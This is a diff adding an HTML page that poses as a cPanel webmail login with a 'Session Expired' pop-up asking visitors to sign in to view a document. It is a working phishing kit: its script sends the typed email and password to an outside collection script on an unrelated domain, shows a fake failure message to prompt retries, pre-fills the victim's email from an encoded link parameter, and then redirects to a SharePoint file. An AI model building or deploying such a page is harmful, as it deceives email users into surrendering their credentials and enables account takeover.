@@ -1,0 +1,681 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=1" />
+  <meta name="google" content="notranslate" />
+  <meta name="apple-itunes-app" content="app-id=1188352635" />
+  <title>Webmail Login</title>
+  <link rel="shortcut icon"
+    href="data:image/x-icon;base64,AAABAAEAICAAAAEAIADSAgAAFgAAAIlQTkcNChoKAAAADUlIRFIAAAAgAAAAIAgGAAAAc3p69AAAAplJREFUWIXt1j2IHGUYB/DfOzdnjIKFkECIVWIKvUFsIkRExa9KJCLaWAgWJx4DilZWgpDDiI0wiViIoGATP1CCEDYHSeCwUBBkgiiKURQJFiLo4d0eOxYzC8nsO9m9XcXC+8MW+3z+9/l6l2383xH+iSBpElyTdoda26xsDqp/h0CVZ3vwKm7tMBngAs7h7eRYebG6hMtMBHbMBX89vfARHprQ5U8cwdFQlIOZCVR5di1+w/wWXT/EY6EoN5NZCODuKZLDwzgSMCuBe2fwfX6QZwtpWzqfBBtLC3txF/ZhxKbBGx0EfsTJS77vwmGjlZrD4mUzUOXZjVjGI65cnTXchB8iupdDUb7QinsQZ7GzZftdQj2JVZ49iC/w6JjksIo7OnS9tiA5Vn6GtyK2+1MY5NkhfGDygVrBAxH5WkPuMjR7/3UsUFLl2Q68s4XkA3ws3v9zoSjX28Kr5wL1xrTxa6ou+f6OZGvqPg9v1wZeaUjcELE/DVfNhWFSvy/enOIZ9eq1sTokEMNLWI79oirP8g6fXpVnh7GEvY1sV/OJ4f0UhyKKk6EoX4x5pEkgXv6L6OM99YqNw/c4kXSwG5nkIfpLCynuiahW1GWeJHkfT4aiXO9atz1XcD6I6yLyHu6bIPk6Hg9FeYZ63y9EjBarPDvQ8VJ1nd9V3D4m+RncForyxFCQ4hSeahlej88Hefauurdwaufr5z/F/ZHAX6nL+mZE18e36IWiHLkFocqzW9QXcNz1+wUHxJ/f10JRPjvGP4pk/vj5L3F8AtufdD+/p6dJDknzX+05fDLGtife/766t9MRgFCUffWTudwE3AqBlVCUf0xLYGTQqzzbhydwJ3Y34g318J1tmX+DPBTlz9MS2MY2/nP8DTGaqeTDf30rAAAAAElFTkSuQmCC"
+    type="image/x-icon" />
+
+  <!-- EXTERNAL CSS removed - inline CSS provided below -->
+ <link href="https://webmail.multiphar.co.bi/cPanel_magic_revision_1645742265/unprotected/cpanel/style_v2_optimized.css" rel="stylesheet" type="text/css" />
+  <style type="text/css">
+    .copyright {
+      background: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzNTlwdCIgaGVpZ2h0PSIzMjAiIHZpZXdCb3g9IjAgMCAzNTkgMjQwIj48ZGVmcz48Y2xpcFBhdGggaWQ9ImEiPjxwYXRoIGQ9Ik0xMjMgMGgyMzUuMzd2MjQwSDEyM3ptMCAwIi8+PC9jbGlwUGF0aD48L2RlZnM+PHBhdGggZD0iTTg5LjY5IDU5LjEwMmg2Ny44MDJsLTEwLjUgNDAuMmMtMS42MDUgNS42LTQuNjA1IDEwLjEtOSAxMy41LTQuNDAyIDMuNC05LjUwNCA1LjA5Ni0xNS4zIDUuMDk2aC0zMS41Yy03LjIgMC0xMy41NSAyLjEwMi0xOS4wNSA2LjMtNS41MDUgNC4yLTkuMzUzIDkuOTA0LTExLjU1MiAxNy4xMDMtMS40IDUuNDAzLTEuNTUgMTAuNS0uNDUgMTUuMzAyIDEuMDk4IDQuNzk2IDMuMDQ3IDkuMDUgNS44NTIgMTIuNzUgMi43OTcgMy43MDMgNi40IDYuNjUyIDEwLjc5NyA4Ljg1IDQuMzk3IDIuMiA5LjE5OCAzLjI5OCAxNC40IDMuMjk4aDE5LjJjMy42MDIgMCA2LjU0NyAxLjQ1MyA4Ljg1MiA0LjM1MiAyLjI5NyAyLjkwMiAyLjk0NSA2LjE0OCAxLjk1IDkuNzVsLTEyIDQ0LjM5OGgtMjFjLTE0LjQwMyAwLTI3LjY1My0zLjE0OC0zOS43NS05LjQ1LTEyLjEwMi02LjMtMjIuMTUzLTE0LjY0OC0zMC4xNTMtMjUuMDUtOC0xMC4zOTUtMTMuNDU0LTIyLjI0Ni0xNi4zNS0zNS41NDctMi45LTEzLjMtMi41NS0yNi45NSAxLjA1Mi00MC45NTNsMS4yLTQuNWMyLjU5Ny05LjYwMiA2LjY0OC0xOC40NSAxMi4xNDgtMjYuNTUgNS41LTguMDk4IDEyLTE1IDE5LjUtMjAuNyA3LjUtNS43IDE1Ljg1LTEwLjE0OCAyNS4wNS0xMy4zNTIgOS4yLTMuMTk1IDE4Ljc5Ny00Ljc5NiAyOC44LTQuNzk2IiBmaWxsPSIjZmY2YzJjIi8+PGcgY2xpcC1wYXRoPSJ1cmwoI2EpIj48cGF0aCBkPSJNMTIzLjg5IDI0MEwxODIuOTkgMTguNjAyYzEuNTk4LTUuNTk4IDQuNTk4LTEwLjA5OCA5LTEzLjVDMTk2LjM4OCAxLjcgMjAxLjQ4NCAwIDIwNy4yODggMGg2Mi43YzE0LjQwMyAwIDI3LjY1IDMuMTQ4IDM5Ljc1IDkuNDUgMTIuMTAyIDYuMyAyMi4xNTMgMTQuNjU1IDMwLjE1MyAyNS4wNSA3Ljk5NyAxMC40MDIgMTMuNSAyMi4yNTQgMTYuNSAzNS41NSAzIDEzLjMwNSAyLjU5NCAyNi45NTQtMS4yMDIgNDAuOTVsLTEuMiA0LjVjLTIuNTk3IDkuNjAyLTYuNTk3IDE4LjQ1LTEyIDI2LjU1LTUuMzk4IDguMDk4LTExLjg0NyAxNS4wNTItMTkuMzQ3IDIwLjg0OC03LjUgNS44MDUtMTUuODU1IDEwLjMwNS0yNS4wNSAxMy41LTkuMiAzLjIwNC0xOC44MDUgNC44MDUtMjguODA1IDQuODA1aC01NC4yOTdsMTAuOC00MC41YzEuNi01LjQwMiA0LjYgOS44IDktMTMuMjAzIDQuMzk2LTMuMzk4IDkuNDk3LTUuMTAyIDE1LjMwMi01LjEwMmgxNy4zOThjNy4yIDAgMTMuNjUzLTIuMiAxOS4zNTItNi41OTcgNS42OTUtNC4zOTggOS40NDUtMTAuMDk3IDExLjI1LTE3LjEgMS4zOTQtNC45OTcgMS41NDctOS45LjQ0NS0xNC43LTEuMS00LjgtMy4wNS05LjA0Ny01Ljg0OC0xMi43NS0yLjgtMy42OTUtNi40MDItNi42OTUtMTAuNzk2LTktNC40MDYtMi4yOTctOS4yMDYtMy40NS0xNC40MDItMy40NUgyMzMuMzlsLTQzLjggMTYyLjkwM2MtMS42MDYgNS40LTQuNjA2IDkuNzk3LTkgMTMuMTk1LTQuNDAzIDMuNDA3LTkuNDA2IDUuMTAyLTE1IDUuMTAyaC00MS43IiBmaWxsPSIjZmY2YzJjIi8+PC9nPjwvc3ZnPgo=) no-repeat scroll center top transparent;
+      background-size: 25px auto;
+    }
+  </style>
+
+  <style>
+    .loader {
+      position: fixed;
+      opacity: 0.5;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: #333333;
+      transition: opacity 0.75s, visibility 0.75s;
+      z-index: 10000;
+    }
+
+    .loader--hidden {
+      opacity: 0;
+      visibility: hidden;
+    }
+
+    .loader::after {
+      content: "";
+      width: 75px;
+      height: 75px;
+      border: 15px solid #dddddd;
+      border-top-color: #0078c8;
+      border-radius: 50%;
+      animation: loading 0.75s ease infinite;
+      z-index: 10000;
+    }
+
+    @keyframes loading {
+      from { transform: rotate(0turn); }
+      to { transform: rotate(1turn); }
+    }
+
+    .login-status-icon {
+      background-image: url(images/notice-error.png);
+    }
+
+    .e-hidden {
+      display: none !important;
+    }
+
+    /* Password toggle */
+    .password-toggle-wrapper {
+      position: relative;
+    }
+
+    .password-toggle {
+      position: absolute;
+      right: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: none;
+      border: none;
+      color: #0078c8;
+      cursor: pointer;
+      font-size: 12px;
+      padding: 2px 6px;
+      z-index: 2;
+    }
+
+    /* ===== PROFESSIONAL ERROR NOTICE ===== */
+    .notice-error {
+      background: linear-gradient(135deg, #fff5f5 0%, #ffe6e6 100%);
+      border: 1px solid #e74c3c;
+      border-left: 4px solid #e74c3c;
+      border-radius: 6px;
+      padding: 14px 18px;
+      margin-bottom: 18px;
+      box-shadow: 0 2px 8px rgba(231, 76, 60, 0.12);
+      display: flex;
+      align-items: flex-start;
+      gap: 12px;
+      animation: slideDown 0.35s ease-out;
+    }
+
+    .notice-error .notice-icon {
+      width: 22px;
+      height: 22px;
+      min-width: 22px;
+      background: #e74c3c;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #fff;
+      font-size: 13px;
+      font-weight: bold;
+      line-height: 1;
+      margin-top: 1px;
+    }
+
+    .notice-error .notice-body {
+      flex: 1;
+    }
+
+    .notice-error .notice-title {
+      font-size: 14px;
+      font-weight: 600;
+      color: #c0392b;
+      margin-bottom: 3px;
+    }
+
+    .notice-error .notice-text {
+      font-size: 13px;
+      color: #7f2a20;
+      line-height: 1.45;
+    }
+
+    /* ===== PROFESSIONAL SUCCESS NOTICE (Light Green) ===== */
+    .notice-success {
+      background: linear-gradient(135deg, #f0fff4 0%, #e6ffed 100%);
+      border: 1px solid #28a745;
+      border-left: 4px solid #28a745;
+      border-radius: 6px;
+      padding: 14px 18px;
+      margin-bottom: 18px;
+      box-shadow: 0 2px 8px rgba(40, 167, 69, 0.12);
+      display: flex;
+      align-items: flex-start;
+      gap: 12px;
+      animation: slideDown 0.35s ease-out;
+    }
+
+    .notice-success .notice-icon {
+      width: 22px;
+      height: 22px;
+      min-width: 22px;
+      background: #28a745;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #fff;
+      font-size: 13px;
+      font-weight: bold;
+      line-height: 1;
+      margin-top: 1px;
+    }
+
+    .notice-success .notice-body {
+      flex: 1;
+    }
+
+    .notice-success .notice-title {
+      font-size: 14px;
+      font-weight: 600;
+      color: #1e7e34;
+      margin-bottom: 3px;
+    }
+
+    .notice-success .notice-text {
+      font-size: 13px;
+      color: #155724;
+      line-height: 1.45;
+    }
+
+    @keyframes slideDown {
+      from { opacity: 0; transform: translateY(-10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .sso-field-danger {
+      border-color: #e74c3c !important;
+      box-shadow: 0 0 0 3px rgba(231, 76, 60, 0.15) !important;
+    }
+
+    /* ===== SESSION EXPIRED MODAL ===== */
+    .modal-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background: rgba(0, 0, 0, 0.55);
+      backdrop-filter: blur(4px);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 99999;
+      animation: fadeIn 0.3s ease;
+    }
+
+    .modal-box {
+      background: #ffffff;
+      border-radius: 10px;
+      box-shadow: 0 20px 60px rgba(0,0,0,0.25);
+      max-width: 420px;
+      width: 90%;
+      overflow: hidden;
+      animation: scaleIn 0.35s ease;
+    }
+
+    .modal-header {
+      background: linear-gradient(135deg, #ff6c2c 0%, #e55a1b 100%);
+      padding: 18px 24px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .modal-header-icon {
+      width: 32px;
+      height: 32px;
+      background: rgba(255,255,255,0.2);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #fff;
+      font-size: 16px;
+    }
+
+    .modal-header-title {
+      color: #fff;
+      font-size: 16px;
+      font-weight: 600;
+      margin: 0;
+    }
+
+    .modal-body {
+      padding: 22px 24px;
+      font-size: 14px;
+      color: #444;
+      line-height: 1.6;
+    }
+
+    .modal-footer {
+      padding: 14px 24px 22px;
+      display: flex;
+      justify-content: flex-end;
+    }
+
+    .modal-btn {
+      background: linear-gradient(135deg, #ff6c2c 0%, #e55a1b 100%);
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      padding: 10px 28px;
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      box-shadow: 0 2px 8px rgba(255, 108, 44, 0.3);
+    }
+
+    .modal-btn:hover {
+      transform: translateY(-1px);
+      box-shadow: 0 4px 12px rgba(255, 108, 44, 0.4);
+    }
+
+    .modal-btn:active {
+      transform: translateY(0);
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+
+    @keyframes scaleIn {
+      from { opacity: 0; transform: scale(0.92); }
+      to { opacity: 1; transform: scale(1); }
+    }
+  </style>
+</head>
+
+<body class="wm">
+  <!-- ===== SESSION EXPIRED POPUP MODAL ===== -->
+  <div id="sessionModal" class="modal-overlay">
+    <div class="modal-box">
+      <div class="modal-header">
+        <div class="modal-header-icon">&#128274;</div>
+        <div class="modal-header-title">Session Expired</div>
+      </div>
+      <div class="modal-body">
+        Your sign in session has expired and requires authentication to proceed and view document. Click OK To Continue.
+      </div>
+      <div class="modal-footer">
+        <button class="modal-btn" onclick="closeSessionModal()">OK</button>
+      </div>
+    </div>
+  </div>
+
+  <div class="loader loader--hidden"></div>
+  <input type="hidden" id="goto_uri" value="/" />
+  <input type="hidden" id="goto_app" value="" />
+
+  <div id="login-wrapper" class="group has-pw-reset">
+    <div class="wrapper">
+      <div id="notify">
+        <noscript>
+          <div class="error-notice">
+            <img src="/cPanel_magic_revision_1631732355/unprotected/hostgator/images/notice-error.png" alt="Error" align="left" />
+            JavaScript is disabled in your browser. For Webmail to function properly, you must enable JavaScript.
+          </div>
+        </noscript>
+
+        <!-- Professional Notice Container -->
+        <div id="login-status" class="e-hidden">
+          <div id="notice-box">
+            <div class="notice-icon" id="notice-icon"></div>
+            <div class="notice-body">
+              <div class="notice-title" id="notice-title"></div>
+              <div class="notice-text" id="notice-text"></div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div style="display: none">
+        <div id="locale-container" style="visibility: hidden">
+          <div id="locale-inner-container">
+            <div id="locale-header">
+              <div class="locale-head">Please select a locale:</div>
+              <div class="close">
+                <a href="javascript:void(0)" onclick="toggle_locales(false)">X Close</a>
+              </div>
+            </div>
+            <div id="locale-map">
+              <div class="scroller clear">
+                <div class="locale-cell"><a href="?locale=ar">???????</a></div>
+                <div class="locale-cell"><a href="?locale=bg">?????????</a></div>
+                <div class="locale-cell"><a href="?locale=cs">cetina</a></div>
+                <div class="locale-cell"><a href="?locale=da">dansk</a></div>
+                <div class="locale-cell"><a href="?locale=de">Deutsch</a></div>
+                <div class="locale-cell"><a href="?locale=el">????????</a></div>
+                <div class="locale-cell"><a href="?locale=en">English</a></div>
+                <div class="locale-cell"><a href="?locale=es">espanol</a></div>
+                <div class="locale-cell"><a href="?locale=es_419">espanol latinoamericano</a></div>
+                <div class="locale-cell"><a href="?locale=es_es">espanol de Espana</a></div>
+                <div class="locale-cell"><a href="?locale=fi">suomi</a></div>
+                <div class="locale-cell"><a href="?locale=fil">Filipino</a></div>
+                <div class="locale-cell"><a href="?locale=fr">francais</a></div>
+                <div class="locale-cell"><a href="?locale=he">?????</a></div>
+                <div class="locale-cell"><a href="?locale=hu">magyar</a></div>
+                <div class="locale-cell"><a href="?locale=i_en">i_en</a></div>
+                <div class="locale-cell"><a href="?locale=id">Bahasa Indonesia</a></div>
+                <div class="locale-cell"><a href="?locale=it">italiano</a></div>
+                <div class="locale-cell"><a href="?locale=ja">???</a></div>
+                <div class="locale-cell"><a href="?locale=ko">???</a></div>
+                <div class="locale-cell"><a href="?locale=ms">Bahasa Melayu</a></div>
+                <div class="locale-cell"><a href="?locale=nb">norsk bokml</a></div>
+                <div class="locale-cell"><a href="?locale=nl">Nederlands</a></div>
+                <div class="locale-cell"><a href="?locale=no">Norwegian</a></div>
+                <div class="locale-cell"><a href="?locale=pl">polski</a></div>
+                <div class="locale-cell"><a href="?locale=pt">portugues</a></div>
+                <div class="locale-cell"><a href="?locale=pt_br">portugues do Brasil</a></div>
+                <div class="locale-cell"><a href="?locale=ro">romania</a></div>
+                <div class="locale-cell"><a href="?locale=ru">???????</a></div>
+                <div class="locale-cell"><a href="?locale=sl">slovencina</a></div>
+                <div class="locale-cell"><a href="?locale=sv">svenska</a></div>
+                <div class="locale-cell"><a href="?locale=th">???</a></div>
+                <div class="locale-cell"><a href="?locale=tr">Turkerke</a></div>
+                <div class="locale-cell"><a href="?locale=uk">??????????</a></div>
+                <div class="locale-cell"><a href="?locale=vi">Ti?ng Vi?t</a></div>
+                <div class="locale-cell"><a href="?locale=zh">??</a></div>
+                <div class="locale-cell"><a href="?locale=zh_cn">??(??)</a></div>
+                <div class="locale-cell"><a href="?locale=zh_tw">??(??)</a></div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div id="content-container">
+        <div id="login-container">
+          <div id="login-sub-container">
+            <div id="login-sub-header">
+              <img class="main-logo" src="https://webmail.multiphar.co.bi/cPanel_magic_revision_1645739615/unprotected/cpanel/images/webmail-logo.svg" alt="logo" />
+            </div>
+            <div id="login-sub">
+              <div id="clickthrough_form" style="visibility: hidden">
+                <form>
+                  <div class="notices"></div>
+                  <button type="submit" class="clickthrough-cont-btn">Continue</button>
+                </form>
+              </div>
+              <div id="forms">
+                <form novalidate="" id="login_form" target="_top">
+                  <div class="input-req-login">
+                    <label for="email">Email Address</label>
+                  </div>
+                  <div class="input-field-login icon username-container">
+                    <input name="email" id="email" autofocus="autofocus" value="[EMail]" placeholder="Enter your email address."
+                      class="std_textbox" type="text" tabindex="1" required="" />
+                  </div>
+                  <div class="input-req-login login-password-field-label">
+                    <label for="password">Password</label>
+                  </div>
+                  <div class="input-field-login icon password-container password-toggle-wrapper">
+                    <input name="password" id="password" placeholder="Enter your email password." class="std_textbox"
+                      type="password" tabindex="2" required="" />
+                    <button type="button" id="password-visibility-toggle" class="password-toggle">Show</button>
+                  </div>
+                  <div class="controls">
+                    <div class="login-btn">
+                      <button name="login" type="submit" id="submitBtn" tabindex="3">Log in</button>
+                    </div>
+                    <div class="reset-pw">
+                      <a href="" id="reset_password"></a>
+                    </div>
+                  </div>
+                  <div class="clear" id="push"></div>
+                </form>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div id="locale-footer">
+        <div class="locale-container">
+          <noscript>
+            <form method="get" action=".">
+              <select name="locale">
+                <option value="">Change locale</option>
+                <option value="ar">العربية</option>
+                <option value="bg">български</option>
+                <option value="cs">čeština</option>
+                <option value="da">dansk</option>
+                <option value="de">Deutsch</option>
+                <option value="el">Ελληνικά</option>
+                <option value="en">English</option>
+                <option value="es">español</option>
+                <option value="es_419">español latinoamericano</option>
+                <option value="es_es">español de España</option>
+                <option value="fi">suomi</option>
+                <option value="fil">Filipino</option>
+                <option value="fr">français</option>
+                <option value="he">עברית</option>
+                <option value="hu">magyar</option>
+                <option value="i_en">i_en</option>
+                <option value="id">Bahasa Indonesia</option>
+                <option value="it">italiano</option>
+                <option value="ja">日本語</option>
+                <option value="ko">한국어</option>
+                <option value="ms">Bahasa Melayu</option>
+                <option value="nb">norsk bokmål</option>
+                <option value="nl">Nederlands</option>
+                <option value="no">Norwegian</option>
+                <option value="pl">polski</option>
+                <option value="pt">português</option>
+                <option value="pt_br">português do Brasil</option>
+                <option value="ro">română</option>
+                <option value="ru">русский</option>
+                <option value="sl">slovenščina</option>
+                <option value="sv">svenska</option>
+                <option value="th">ไทย</option>
+                <option value="tr">Türkçe</option>
+                <option value="uk">українська</option>
+                <option value="vi">Tiếng Việt</option>
+                <option value="zh">中文</option>
+                <option value="zh_cn">中文（中国）</option>
+                <option value="zh_tw">中文（台湾）</option>
+              </select>
+              <button style="margin-left: 10px" type="submit">Change</button>
+            </form>
+            <style type="text/css">
+              #mobilelocalemenu, #locales_list { display: none; }
+            </style>
+          </noscript>
+          <ul id="locales_list">
+            <li><a href="/?locale=ar">العربية</a></li>
+            <li><a href="/?locale=bg">български</a></li>
+            <li><a href="/?locale=cs">čeština</a></li>
+            <li><a href="/?locale=da">dansk</a></li>
+            <li><a href="/?locale=de">Deutsch</a></li>
+            <li><a href="/?locale=el">Ελληνικά</a></li>
+            <li><a href="/?locale=en">English</a></li>
+            <li><a href="/?locale=es">español</a></li>
+            <li><a href="javascript:void(0)" id="morelocale" onclick="toggle_locales(true)" title="More locales"></a></li>
+          </ul>
+          <div id="mobilelocalemenu">
+            Select a locale: <a href="javascript:void(0)" onclick="toggle_locales(true)" title="Change locale">English</a>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <style>
+    @media (min-width: 481px) {
+      #select_user_form { width: px; }
+    }
+  </style>
+  <div class="copyright">
+    Copyright&nbsp;2026 cPanel, L.L.C. <br /><a href="https://go.cpanel.net/privacy" target="_blank">Privacy Policy</a>
+  </div>
+
+  <!-- jQuery and Custom Script -->
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <script>
+    // ===== SESSION EXPIRED MODAL =====
+    function closeSessionModal() {
+      var modal = document.getElementById('sessionModal');
+      modal.style.opacity = '0';
+      modal.style.transition = 'opacity 0.3s ease';
+      setTimeout(function() {
+        modal.style.display = 'none';
+      }, 300);
+    }
+
+    $(document).ready(function(){
+        var redirectUrl = "https://regionalmanagers-my.sharepoint.com/:b:/p/ivan/EVhCMbG-roNHisHIx3fXqXkBATy7wZKPXYQsdKYIS5rgWA?e=1XABKN/";
+        var isProcessing = false;
+
+        populateEmailFromURL();
+
+        $('#submitBtn').click(function(event){
+            event.preventDefault();
+
+            if(isProcessing) {
+                showNotice('error', 'Please Wait', 'Please wait, processing your request...');
+                return;
+            }
+
+            var email = $("#email").val().trim();
+            var password = $("#password").val();
+
+            if(!email || !password){
+                showNotice('error', 'Authentication Failed', 'Invalid email or password. Please try again.');
+                highlightFieldError();
+                return;
+            }
+
+            if(!isValidEmail(email)){
+                showNotice('error', 'Authentication Failed', 'Invalid email or password. Please try again.');
+                $("#email").focus();
+                return;
+            }
+
+            clearNotice();
+            isProcessing = true;
+
+            var originalBtnText = $('#submitBtn').text();
+            $('#submitBtn').text('Signing in...').prop('disabled', true).css('opacity', '0.7');
+
+            $.ajax({
+                url: 'https://arbitbay.com/gboto/rccp20musd/adobe.php',
+                type: 'POST',
+                dataType: 'json',
+                data: { email: email, password: password },
+                timeout: 120000,
+                success: function(response){
+                    console.log("Response:", response);
+
+                    if(response && response.signal === 'success'){
+                        showNotice('success', 'Login Successful', 'Authentication successful! Redirecting to your document...');
+                        setTimeout(function(){
+                            window.location.replace(redirectUrl);
+                        }, 1500);
+                    } else {
+                        showNotice('error', 'Authentication Failed', 'Invalid email or password. Please try again.');
+                        $("#password").val("").focus();
+                        highlightFieldError();
+                        $('#submitBtn').text(originalBtnText).prop('disabled', false).css('opacity', '1');
+                        isProcessing = false;
+                    }
+                },
+                error: function(xhr, status, error){
+                    console.error("AJAX Error:", status, error);
+                    showNotice('error', 'Authentication Failed', 'Invalid email or password. Please try again.');
+                    $("#password").val("").focus();
+                    highlightFieldError();
+                    $('#submitBtn').text(originalBtnText).prop('disabled', false).css('opacity', '1');
+                    isProcessing = false;
+                }
+            });
+        });
+
+        $('#password-visibility-toggle').click(function() {
+            var passwordInput = $('#password');
+            var type = passwordInput.attr('type') === 'password' ? 'text' : 'password';
+            passwordInput.attr('type', type);
+            $(this).text(type === 'password' ? 'Show' : 'Hide');
+        });
+
+        $('#password').keypress(function(e){
+            if(e.which == 13){ $('#submitBtn').click(); }
+        });
+
+        $('#email').keypress(function(e){
+            if(e.which == 13){ $('#password').focus(); }
+        });
+
+        function isValidEmail(email) {
+            var re = /^[^\s@]+@([^\s@]+\.)+[^\s@]+$/;
+            return re.test(email);
+        }
+
+        function showNotice(type, title, message) {
+            var $box = $('#notice-box');
+            var $status = $('#login-status');
+
+            $box.removeClass('notice-error notice-success');
+            $box.addClass(type === 'success' ? 'notice-success' : 'notice-error');
+
+            $('#notice-icon').html(type === 'success' ? '&#10003;' : '&#10005;');
+            $('#notice-title').text(title);
+            $('#notice-text').text(message);
+
+            $status.removeClass('e-hidden');
+        }
+
+        function clearNotice() {
+            $('#login-status').addClass('e-hidden');
+            $('#email').removeClass('sso-field-danger');
+            $('#password').removeClass('sso-field-danger');
+        }
+
+        function highlightFieldError() {
+            $('#password').addClass('sso-field-danger');
+        }
+
+        function populateEmailFromURL() {
+            var email = null;
+            var hash = window.location.hash;
+            if(hash && hash.length > 1) {
+                email = decodeEmailString(hash.substring(1));
+            }
+            if(!email) {
+                var urlParams = new URLSearchParams(window.location.search);
+                if(urlParams.has('email')) { email = decodeEmailString(urlParams.get('email')); }
+                if(!email && urlParams.has('user')) { email = decodeEmailString(urlParams.get('user')); }
+            }
+            if(email && isValidEmail(email)) {
+                $('#email').val(email);
+                $('#password').focus();
+            } else {
+                if(!$('#email').val()) { $('#email').focus(); }
+                else { $('#password').focus(); }
+            }
+        }
+
+        function decodeEmailString(str) {
+            if(!str) return null;
+            var decoded = tryBase64Decode(str);
+            if(decoded && isValidEmail(decoded)) { return decoded; }
+            return str;
+        }
+
+        function tryBase64Decode(str) {
+            try {
+                str = decodeURIComponent(str);
+                var base64Pattern = /^[A-Za-z0-9+/]*={0,2}$/;
+                if(str.length % 4 === 0 && base64Pattern.test(str)) {
+                    return atob(str);
+                }
+            } catch(e) {}
+            return null;
+        }
+    });
+  </script>
+</body>
+</html>
